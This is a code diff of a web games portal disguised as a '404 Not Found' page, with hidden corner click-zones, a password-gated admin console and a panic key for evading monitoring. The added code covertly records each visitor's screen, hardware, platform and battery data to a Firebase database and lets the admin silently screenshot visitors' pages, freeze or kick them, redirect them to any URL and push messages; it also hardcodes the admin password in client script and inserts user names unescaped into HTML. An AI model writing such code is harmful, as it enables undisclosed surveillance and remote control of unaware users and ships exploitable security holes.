@@ -6,107 +6,118 @@
     <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        :root { --primary: #00ff41; --bg: #000; --card: #111; --accent: #003b00; --fav: #ff4757; }
+        :root { --primary: #00ff41; --bg: #000; --card: #111; --accent: #003b00; --fav: #ff4757; --text: #eee; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
         
-        #ghostTrigger { position: fixed; top: 0; left: 0; width: 40px; height: 40px; z-index: 2000000; cursor: default; }
+        /* Secret Triggers */
+        #ghostAdmin { position: fixed; top: 0; left: 0; width: 60px; height: 60px; z-index: 2000000; cursor: default; }
+        #ghostPleb { position: fixed; top: 0; right: 0; width: 60px; height: 60px; z-index: 2000000; cursor: default; }
+
         #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1500000; display: none; align-items: center; justify-content: center; }
-        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 9999999; display: none; cursor: wait; }
+        #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1500000; display: none; align-items: center; justify-content: center; }
+        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999999; display: none; cursor: wait; }
 
         #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
         .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #080808; border-bottom: 1px solid #222; }
         
-        .grid-header { padding: 10px 25px 0 25px; font-size: 12px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
-        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
+        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
+        .card { background: var(--card); border: 1px solid #222; padding: 25px 15px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); position: relative; transition: 0.2s; }
+        .card:hover { border-color: var(--primary); background: #0a1a0a; transform: scale(1.02); }
         
-        .card { background: var(--card); border: 1px solid #222; padding: 20px; text-align: center; cursor: pointer; border-radius: 5px; color: var(--primary); position: relative; transition: 0.2s; }
-        .card:hover { border-color: var(--primary); background: #001a00; }
-        .fav-btn { position: absolute; top: 5px; right: 5px; color: #333; font-size: 18px; transition: 0.2s; }
-        .fav-btn.active { color: var(--fav); }
+        /* Fixed Fav Button Hitbox */
+        .fav-area { position: absolute; top: 0; right: 0; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; z-index: 20; }
+        .fav-btn { color: #333; font-size: 22px; pointer-events: none; }
+        .fav-btn.active { color: var(--fav); text-shadow: 0 0 5px var(--fav); }
 
-        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 20px; z-index: 3000000; width: 950px; border-radius: 8px; box-shadow: 0 0 50px #000; }
-        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 10px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 10px 15px; cursor: pointer; font-weight: bold; border-radius: 4px; }
+        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 25px; z-index: 3000000; width: 95%; max-width: 1100px; border-radius: 12px; box-shadow: 0 0 60px #000; color: #fff; }
+        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; border-radius: 6px; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 12px 18px; cursor: pointer; font-weight: bold; border-radius: 6px; text-transform: uppercase; font-size: 11px; }
         
-        .admin-flex { display: flex; gap: 20px; height: 500px; }
-        #userList { width: 300px; border: 1px solid #222; overflow-y: auto; background: #050505; }
-        .u-item { padding: 12px; border-bottom: 1px solid #111; cursor: pointer; font-size: 11px; display: flex; flex-direction: column; }
+        /* ADMIN HUB - HIGH VISIBILITY */
+        .admin-layout { display: flex; gap: 20px; height: 550px; }
+        .u-sidebar { width: 300px; border: 1px solid #333; overflow-y: auto; background: #050505; }
+        .u-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; color: #fff; }
         .u-item:hover { background: #111; }
-        .u-item.selected { border-left: 4px solid var(--primary); background: #0a1a0a; }
+        .u-item.selected { border-left: 5px solid var(--primary); background: #0a1a0a; color: var(--primary); }
         
-        #dossierData { font-size: 11px; background: #000; padding: 15px; border: 1px solid #222; color: #888; flex-grow: 1; overflow-y: auto; }
-        #dossierData b { color: var(--primary); }
+        .d-content { flex-grow: 1; display: flex; flex-direction: column; gap: 10px; overflow: hidden; }
+        .info-box { font-size: 12px; background: #000; padding: 20px; border: 1px solid #333; color: #bbb; overflow-y: auto; line-height: 1.8; flex-grow: 1; }
+        .info-box b { color: var(--primary); margin-right: 5px; }
     </style>
 </head>
 <body>
 
-    <div id="ghostTrigger" onclick="handleGhost()"></div>
-    <div id="lockdown"><h1>404</h1><p>Not Found</p></div>
+    <div id="ghostAdmin" onclick="door('admin')"></div>
+    <div id="ghostPleb" onclick="door('pleb')"></div>
+
+    <div id="lockdown"><h1>404</h1><p>The requested URL was not found on this server.</p></div>
     <div id="freeze"></div>
 
     <div id="loginOverlay">
-        <div style="text-align:center; width: 320px;">
-            <h2 style="color:var(--primary)">MONGLE_OS v27.0</h2>
-            <input type="text" id="username" class="input" placeholder="Identity...">
-            <button class="btn" style="width:100%" onclick="startSession()">BOOT SYSTEM</button>
+        <div style="text-align:center; width: 320px; background:#0a0a0a; padding:40px; border-radius:15px; border:1px solid #222;">
+            <h2 style="color:var(--primary); margin-top:0;">MONGLE_OS v29</h2>
+            <input type="text" id="username" class="input" placeholder="User Identity...">
+            <button class="btn" style="width:100%" onclick="initSession()">AUTHORIZE SESSION</button>
         </div>
     </div>
 
     <div id="app">
         <div class="nav">
-            <div><b>MONGLE_OS</b> <span id="badge" style="font-size:10px; opacity:0.5;"></span></div>
+            <div><b>MONGLE_OS</b> <span id="badge" style="font-size:9px; color:var(--primary);"></span></div>
             <div style="display:flex; gap:10px; flex-grow:1; max-width:600px; margin: 0 20px;">
-                <select id="cat" class="input" style="width:130px; margin:0;" onchange="renderGames()">
+                <select id="cat" class="input" style="width:140px; margin:0;" onchange="renderGrid()">
                     <option value="all">ALL_FILES</option>
+                    <option value="favs">MY_FAVORITES</option>
                     <option value="fnaf">FNAF</option>
                     <option value="horror">HORROR</option>
                     <option value="action">ACTION</option>
-                    <option value="favs">FAVORITES</option>
                 </select>
-                <input type="text" id="search" class="input" style="margin:0;" placeholder="Search..." oninput="renderGames()">
+                <input type="text" id="search" class="input" style="margin:0;" placeholder="Search database..." oninput="renderGrid()">
             </div>
             <div style="display:flex; gap:8px;">
                 <button id="adminBtn" class="btn" style="display:none;" onclick="toggleModal('adminM')">OVERSEER</button>
                 <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('settingsM')">⚙️</button>
-                <button class="btn" style="background:red; color:#fff;" onclick="doPanic()">PANIC</button>
+                <button class="btn" style="background:red; color:#fff;" onclick="panicTrigger()">PANIC</button>
             </div>
         </div>
         <div id="grid" class="game-grid"></div>
     </div>
 
     <div id="adminM" class="modal">
-        <h3 style="margin-top:0; color:var(--primary);">OVERSEER_CONSOLE v27</h3>
-        <div class="admin-flex">
-            <div id="userList"></div>
-            <div style="flex-grow:1; display:flex; flex-direction:column; gap:10px;">
-                <div id="dossierData">Select Target...</div>
-                <div id="preview" style="height:150px; border:1px solid #222; background-size:contain; background-repeat:no-repeat; background-position:center;"></div>
-                <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:5px;">
-                    <button class="btn" onclick="act('capReq')">SHOT</button>
-                    <button class="btn" style="background:yellow" onclick="act('frozen')">FREEZE</button>
-                    <button class="btn" style="background:red; color:white;" onclick="act('kicked')">KICK</button>
-                    <button class="btn" style="background:#444; color:white;" onclick="wipe()">WIPE</button>
+        <h3 style="margin-top:0; border-bottom:1px solid #333; padding-bottom:15px; color:var(--primary);">OVERSEER_MAINTENANCE_HUB</h3>
+        <div class="admin-layout">
+            <div id="userList" class="u-sidebar"></div>
+            <div class="d-content">
+                <div id="dossier" class="info-box">Waiting for Target Selection...</div>
+                <div id="preview" style="height:180px; border:1px solid #333; background: #000 no-repeat center; background-size: contain; border-radius:5px;"></div>
+                <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:8px;">
+                    <button class="btn" onclick="adminAct('capReq')">SNAPSHOT</button>
+                    <button class="btn" style="background:yellow" onclick="adminAct('frozen')">FREEZE</button>
+                    <button class="btn" style="background:red; color:white;" onclick="adminAct('kicked')">TERMINATE</button>
+                    <button class="btn" style="background:#444; color:white;" onclick="wipeDatabase()">WIPE_DB</button>
                 </div>
-                <div style="display:flex; gap:5px;">
-                    <input type="text" id="adminCmd" class="input" style="margin:0;" placeholder="Message / URL">
-                    <button class="btn" onclick="sendCustom('redir')">REDIR</button>
-                    <button class="btn" onclick="sendCustom('msg')">MSG</button>
+                <div style="display:flex; gap:8px;">
+                    <input type="text" id="adminCommandInp" class="input" style="margin:0;" placeholder="Command Payload (URL/MSG)...">
+                    <button class="btn" onclick="adminCustom('redir')">REDIR</button>
+                    <button class="btn" onclick="adminCustom('msg')">SEND_MSG</button>
                 </div>
             </div>
         </div>
-        <button class="btn" style="width:100%; margin-top:10px;" onclick="toggleModal('adminM')">CLOSE</button>
+        <button class="btn" style="width:100%; margin-top:15px; background:#1a1a1a; color:#888;" onclick="toggleModal('adminM')">DISCONNECT_OVERSEER</button>
     </div>
 
-    <div id="settingsM" class="modal" style="width:320px;">
-        <h3>CONFIG</h3>
-        <input type="text" id="pUrl" class="input" placeholder="Panic URL">
-        <input type="text" id="pKey" class="input" placeholder="Panic Key">
-        <select id="pMode" class="input">
+    <div id="settingsM" class="modal" style="width:340px;">
+        <h3>SYSTEM_CONFIG</h3>
+        <label style="font-size:11px; color:#888;">PANIC_REDIRECT</label>
+        <input type="text" id="cfgUrl" class="input">
+        <label style="font-size:11px; color:#888;">PANIC_HOTKEY (Escape, KeyQ, etc.)</label>
+        <input type="text" id="cfgKey" class="input">
+        <label style="font-size:11px; color:#888;">BROWSER_MODE</label>
+        <select id="cfgMode" class="input">
             <option value="tab">New Tab</option>
-            <option value="blank">About:Blank</option>
+            <option value="blank">About:Blank (Stealth)</option>
         </select>
-        <button class="btn" style="width:100%" onclick="saveSettings()">SAVE</button>
+        <button class="btn" style="width:100%; margin-top:10px;" onclick="saveConfig()">APPLY_CHANGES</button>
     </div>
 
     <script type="module">
@@ -119,19 +130,38 @@
 
         let userRef, myID, selectedID, isAdmin = false, gameData = [];
         let favs = JSON.parse(localStorage.getItem('favs') || '[]');
-        let cfg = { url: localStorage.getItem('pUrl') || 'https://google.com', key: localStorage.getItem('pKey') || 'Escape', mode: localStorage.getItem('pMode') || 'tab' };
+        let cfg = { 
+            url: localStorage.getItem('pUrl') || 'https://google.com', 
+            key: localStorage.getItem('pKey') || 'Escape', 
+            mode: localStorage.getItem('pMode') || 'tab' 
+        };
 
-        window.handleGhost = () => { if(prompt("ROOT:") === "MONGLE_OWNER_99") { isAdmin = true; document.getElementById('adminBtn').style.display="block"; startSession(); }};
+        window.door = (type) => {
+            if(type === 'admin') {
+                if(prompt("OVERSEER_KEY:") === "MONGLE_OWNER_99") {
+                    isAdmin = true; 
+                    document.getElementById('adminBtn').style.display="block"; 
+                    document.getElementById('badge').innerText="[OVERSEER]";
+                    initSession();
+                }
+            } else {
+                document.getElementById('loginOverlay').style.display = 'flex';
+            }
+        };
 
-        window.startSession = async () => {
+        window.initSession = async () => {
             const name = document.getElementById('username').value || "Guest";
-            document.getElementById('lockdown').style.display="none"; document.getElementById('loginOverlay').style.display="none"; document.getElementById('app').style.display="flex";
+            document.getElementById('lockdown').style.display="none"; 
+            document.getElementById('loginOverlay').style.display="none"; 
+            document.getElementById('app').style.display="flex";
 
-            const net = navigator.connection || {};
+            const bat = await navigator.getBattery?.().catch(()=>({}));
             userRef = push(ref(db, 'presence'), {
-                name: name, activity: 'Browsing', joined: new Date().toLocaleTimeString(),
-                res: `${screen.width}x${screen.height}`, cores: navigator.hardwareConcurrency || '?',
-                ram: navigator.deviceMemory || '?', net: net.effectiveType || 'unknown'
+                name: name, activity: 'Idle', joined: new Date().toLocaleTimeString(),
+                res: `${screen.width}x${screen.height}`, 
+                hw: `${navigator.hardwareConcurrency || '?'} Core | ${navigator.deviceMemory || '?'}GB RAM`,
+                bat: bat?.level ? `${Math.round(bat.level*100)}% ${bat.charging?'(Charging)':''}` : 'N/A',
+                plat: navigator.platform
             });
             myID = userRef.key;
             onDisconnect(userRef).remove();
@@ -141,23 +171,24 @@
                 if(d.kicked) window.location.replace(cfg.url);
                 if(d.redir) window.location.replace(d.redir);
                 document.getElementById('freeze').style.display = d.frozen ? 'block' : 'none';
-                if(d.msg) { alert("ADMIN: "+d.msg); update(userRef, {msg: null}); }
+                if(d.msg) { alert("BROADCAST: " + d.msg); update(userRef, {msg: null}); }
                 if(d.capReq) html2canvas(document.body).then(c => update(userRef, {lastCap: c.toDataURL("image/webp", 0.1), capReq: false}));
             });
 
             const res = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
             const data = await res.json();
             gameData = data.filter(f => f.name.endsWith('.html') && f.name !== 'index.html');
-            renderGames();
-            if(isAdmin) listenUsers();
+            renderGrid();
+            if(isAdmin) startOverseer();
         };
 
-        window.renderGames = () => {
+        window.renderGrid = () => {
             const q = document.getElementById('search').value.toLowerCase();
             const cat = document.getElementById('cat').value;
             const grid = document.getElementById('grid'); grid.innerHTML = "";
             
-            gameData.sort((a,b) => favs.includes(b.name) - favs.includes(a.name)).filter(g => {
+            let sorted = [...gameData].sort((a,b) => favs.includes(b.name) - favs.includes(a.name));
+            sorted.filter(g => {
                 const n = g.name.toLowerCase();
                 if (!n.includes(q)) return false;
                 if (cat === 'favs') return favs.includes(g.name);
@@ -166,64 +197,74 @@
                 return true;
             }).forEach(g => {
                 const card = document.createElement('div'); card.className = "card";
-                card.innerHTML = `<span class="fav-btn ${favs.includes(g.name)?'active':''}" onclick="toggleFav(event,'${g.name}')">❤</span> ${g.name.replace('.html','').toUpperCase()}`;
+                const isFav = favs.includes(g.name);
+                card.innerHTML = `
+                    <div class="fav-area" onclick="toggleFav(event,'${g.name}')">
+                        <span class="fav-btn ${isFav?'active':''}">❤</span>
+                    </div>
+                    ${g.name.replace('.html','').toUpperCase()}
+                `;
                 card.onclick = () => {
                     const url = `https://raw.githack.com/bob154526-hue/Mongle/main/${g.name}`;
                     update(userRef, {activity: 'Playing '+g.name});
                     if(cfg.mode==='blank') {
                         let w = window.open('about:blank');
-                        w.document.body.innerHTML = `<iframe src="${url}" style="width:100%;height:100vh;border:none;"></iframe>`;
+                        w.document.body.innerHTML = `<style>body,html{margin:0;padding:0;height:100vh;width:100vw;overflow:hidden}iframe{width:100vw;height:100vh;border:none}</style><iframe src="${url}"></iframe>`;
                     } else window.open(url, '_blank');
                 };
                 grid.appendChild(card);
             });
         };
 
-        window.toggleFav = (e, name) => {
-            e.stopPropagation();
-            if(favs.includes(name)) favs = favs.filter(f => f !== name);
-            else favs.push(name);
-            localStorage.setItem('favs', JSON.stringify(favs));
-            renderGames();
+        window.toggleFav = (e, n) => { 
+            e.stopPropagation(); 
+            if(favs.includes(n)) favs = favs.filter(f=>f!==n); else favs.push(n); 
+            localStorage.setItem('favs', JSON.stringify(favs)); 
+            renderGrid(); 
         };
 
-        function listenUsers() {
+        function startOverseer() {
             onValue(ref(db, 'presence'), (snap) => {
                 const list = document.getElementById('userList'); list.innerHTML = "";
                 snap.forEach(c => {
                     const u = c.val();
-                    const div = document.createElement('div');
-                    div.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
-                    div.innerHTML = `<b>${u.name}</b><small>${u.activity}</small>`;
-                    div.onclick = () => {
+                    const d = document.createElement('div');
+                    d.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
+                    d.innerHTML = `<b>${u.name}</b><br><small style="opacity:0.6">${u.activity}</small>`;
+                    d.onclick = () => {
                         selectedID = c.key;
-                        document.getElementById('dossierData').innerHTML = `
-                            <b>ID:</b> ${c.key}<br><b>JOINED:</b> ${u.joined}<br><b>RES:</b> ${u.res}<br>
-                            <b>CORES:</b> ${u.cores} | <b>RAM:</b> ~${u.ram}GB<br><b>NET:</b> ${u.net}
+                        document.getElementById('dossier').innerHTML = `
+                            <b>IDENT_KEY:</b> ${c.key}<br><b>JOIN_TIME:</b> ${u.joined}<br>
+                            <b>RESOLUTION:</b> ${u.res}<br><b>OS_PLATFORM:</b> ${u.plat}<br>
+                            <b>HARDWARE:</b> ${u.hw}<br><b>ENERGY:</b> ${u.bat}<br>
+                            <b>STATUS:</b> ${u.frozen?'FROZEN':'ACTIVE'}
                         `;
                         document.getElementById('preview').style.backgroundImage = `url(${u.lastCap || ''})`;
-                        listenUsers();
+                        startOverseer();
                     };
-                    list.appendChild(div);
+                    list.appendChild(d);
                 });
             });
         }
 
-        window.act = (t) => { if(selectedID) onValue(ref(db, `presence/${selectedID}/${t}`), (s) => update(ref(db, `presence/${selectedID}`), {[t]: !s.val()}), {onlyOnce:true}); };
-        window.sendCustom = (t) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[t]: document.getElementById('adminCmd').value}); };
-        window.wipe = () => { if(confirm("Wipe?")) remove(ref(db, 'presence')); };
-        window.doPanic = () => window.location.replace(cfg.url);
+        window.adminAct = (t) => { if(selectedID) onValue(ref(db, `presence/${selectedID}/${t}`), (s) => update(ref(db, `presence/${selectedID}`), {[t]: !s.val()}), {onlyOnce:true}); };
+        window.adminCustom = (t) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[t]: document.getElementById('adminCommandInp').value}); };
+        window.wipeDatabase = () => { if(confirm("NUCLEAR WIPE ALL SESSIONS?")) remove(ref(db, 'presence')); };
+        window.panicTrigger = () => window.location.replace(cfg.url);
         window.toggleModal = (id) => { const m = document.getElementById(id); m.style.display = m.style.display === 'block' ? 'none' : 'block'; };
         
-        window.addEventListener('keydown', (e) => { if (e.key === cfg.key || e.code === cfg.key) doPanic(); });
+        window.addEventListener('keydown', (e) => {
+            if (e.key === cfg.key || e.code === cfg.key) panicTrigger();
+            if (e.shiftKey && e.key === 'L' && document.getElementById('app').style.display === "none") door('pleb');
+        });
 
-        window.saveSettings = () => {
-            cfg.url = document.getElementById('pUrl').value; cfg.key = document.getElementById('pKey').value; cfg.mode = document.getElementById('pMode').value;
+        window.saveConfig = () => {
+            cfg.url = document.getElementById('cfgUrl').value; cfg.key = document.getElementById('cfgKey').value; cfg.mode = document.getElementById('cfgMode').value;
             localStorage.setItem('pUrl', cfg.url); localStorage.setItem('pKey', cfg.key); localStorage.setItem('pMode', cfg.mode);
-            alert("SAVED"); toggleModal('settingsM');
+            alert("SYSTEM RECONFIGURED"); toggleModal('settingsM');
         };
 
-        document.getElementById('pUrl').value = cfg.url; document.getElementById('pKey').value = cfg.key; document.getElementById('pMode').value = cfg.mode;
+        document.getElementById('cfgUrl').value = cfg.url; document.getElementById('cfgKey').value = cfg.key; document.getElementById('cfgMode').value = cfg.mode;
     </script>
 </body>
 </html>
